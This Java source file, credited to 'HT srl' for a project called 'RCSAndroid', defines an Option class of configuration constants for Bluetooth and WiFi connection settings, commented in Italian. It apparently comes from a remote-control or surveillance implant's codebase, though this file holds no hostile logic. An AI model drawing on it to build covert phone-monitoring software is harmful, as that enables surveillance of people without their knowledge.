/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 03-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

public class Option {
	/**
	 * Options definitions
	 */
	public static int CONFIGURATION	 			= 0x8000;
	public static int CONFIGURATION_BTGUID      = CONFIGURATION + 0x1; // Guid del device BlueTooth
	public static int CONFIGURATION_WIFIMAC     = CONFIGURATION + 0x2; // MAC dell'access point
	public static int CONFIGURATION_WIFISSID    = CONFIGURATION + 0x3; // SSID della rete WiFi
	public static int CONFIGURATION_BTPIN       = CONFIGURATION + 0x4; // PIN per il pairing del BT
	public static int CONFIGURATION_WIFIKEY     = CONFIGURATION + 0x5; // Chiave di accesso alla rete WiFi ad-hoc
	public static int CONFIGURATION_HOSTNAME    = CONFIGURATION + 0x6; // Non utilizzata
	public static int CONFIGURATION_SERVERIPV6  = CONFIGURATION + 0x7; // Non utilizzata
	public static int CONFIGURATION_LOGDIR      = CONFIGURATION + 0x8; // Non utilizzata
	public static int CONFIGURATION_CONNRETRY   = CONFIGURATION + 0x9; // Non utilizzata
	public static int CONFIGURATION_BTMAC       = CONFIGURATION + 0xa; // Mac address della chiavetta BT
	public static int CONFIGURATION_WIFIENC     = CONFIGURATION + 0xb; // Il tipo di encryption utilizzato WEP/WPA/Niente
	public static int CONFIGURATION_WIFIIP      = CONFIGURATION + 0xc; // Ip del GW WiFi
	
	/**
	 * Option ID
	 */
	private int optionId;

	/**
	 * Parameters
	 */
	private byte[] optionParams;

	public Option(int id, byte[] params) {
		this.optionId = new Integer(id);
		this.optionParams = params;
	}

	int getId() {
		return this.optionId;
	}

	byte[] getParams() {
		return this.optionParams;
	}
}
